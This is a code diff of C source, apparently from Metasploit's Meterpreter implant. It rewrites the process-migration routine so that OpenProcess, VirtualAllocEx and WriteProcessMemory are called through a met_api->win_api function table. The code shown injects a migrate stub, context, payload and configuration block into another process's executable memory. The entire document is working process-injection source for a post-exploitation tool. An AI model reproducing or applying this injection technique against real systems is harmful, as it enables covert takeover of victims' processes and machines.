@@ -593,7 +593,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 		dwProcessAccess = PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
 		dwProcessAccess |= PROCESS_CREATE_THREAD;
 
-		hProcess = OpenProcess(dwProcessAccess, FALSE, dwProcessID);
+		hProcess = met_api->win_api.kernel32.OpenProcess(dwProcessAccess, FALSE, dwProcessID);
 
 		if (!hProcess)
 		{
@@ -638,7 +638,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 
 		// Allocate memory for the migrate stub, context, payload and configuration block
-		lpMemory = (LPBYTE)VirtualAllocEx(hProcess, NULL, dwMigrateStubLength + ctxSize + dwPayloadLength + configSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		lpMemory = (LPBYTE)met_api->win_api.kernel32.VirtualAllocEx(hProcess, NULL, dwMigrateStubLength + ctxSize + dwPayloadLength + configSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		if (!lpMemory)
 		{
 			BREAK_ON_ERROR("[MIGRATE] VirtualAllocEx failed");
@@ -648,28 +648,28 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 		ctx->p.lpPayload = lpMemory + dwMigrateStubLength + ctxSize;
 		// Write the migrate stub to memory...
 		dprintf("[MIGRATE] Migrate stub: 0x%p -> %u bytes", lpMemory, dwMigrateStubLength);
-		if (!WriteProcessMemory(hProcess, lpMemory, lpMigrateStub, dwMigrateStubLength, NULL))
+		if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, lpMemory, lpMigrateStub, dwMigrateStubLength, NULL))
 		{
 			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 1 failed");
 		}
 
 		// Write the migrate context to memory...
 		dprintf("[MIGRATE] Migrate context: 0x%p -> %u bytes", lpMemory + dwMigrateStubLength, ctxSize);
-		if (!WriteProcessMemory(hProcess, lpMemory + dwMigrateStubLength, ctx, ctxSize, NULL))
+		if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, lpMemory + dwMigrateStubLength, ctx, ctxSize, NULL))
 		{
 			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 2 failed");
 		}
 
 		// Write the migrate payload to memory...
 		dprintf("[MIGRATE] Migrate payload: 0x%p -> %u bytes", ctx->p.lpPayload, dwPayloadLength);
-		if (!WriteProcessMemory(hProcess, ctx->p.lpPayload, lpPayloadBuffer, dwPayloadLength, NULL))
+		if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, ctx->p.lpPayload, lpPayloadBuffer, dwPayloadLength, NULL))
 		{
 			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 3 failed");
 		}
 
 		// finally write the configuration stub
 		dprintf("[MIGRATE] Configuration: 0x%p -> %u bytes", ctx->p.lpPayload + dwPayloadLength, configSize);
-		if (!WriteProcessMemory(hProcess, ctx->p.lpPayload + dwPayloadLength, config, configSize, NULL))
+		if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, ctx->p.lpPayload + dwPayloadLength, config, configSize, NULL))
 		{
 			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 4 failed");
 		}
